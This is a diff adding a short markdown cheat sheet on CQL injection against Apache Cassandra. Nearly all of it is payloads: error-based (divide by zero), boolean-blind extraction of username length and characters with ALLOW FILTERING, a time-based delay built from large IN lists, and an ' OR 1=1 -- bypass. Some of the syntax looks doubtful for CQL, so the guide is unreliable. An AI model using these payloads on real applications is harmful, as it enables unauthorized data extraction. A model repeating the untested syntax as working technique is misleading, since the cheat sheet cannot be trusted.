@@ -1,0 +1,30 @@
+# Apache Cassandra
+
+Cassandra uses CQL, similar to SQL, so injection if not parameterized.
+
+## Error-based
+Inject to cause errors like divide by zero.
+
+' AND 1/0=1 -- to error.
+
+## Boolean-based blind
+Append conditions with ALLOW FILTERING for unindexed filters.
+
+For length of username column:
+
+' AND LENGTH(username)>16 ALLOW FILTERING --
+
+(Binary search as in SQL)
+
+For chars: ' AND SUBSTR(username,1,1)='a' ALLOW FILTERING --
+
+But for binary ASCII, use > comparisons.
+
+To find length and extract, use similar binary search payloads.
+
+## Time-based blind
+No built-in sleep; use large IN lists for delay if true.
+
+e.g., ' AND id IN (1,2,...,10000) -- if condition true, but custom.
+
+Limited; use boolean for proof, or bypass ' OR 1=1 -- to retrieve all.
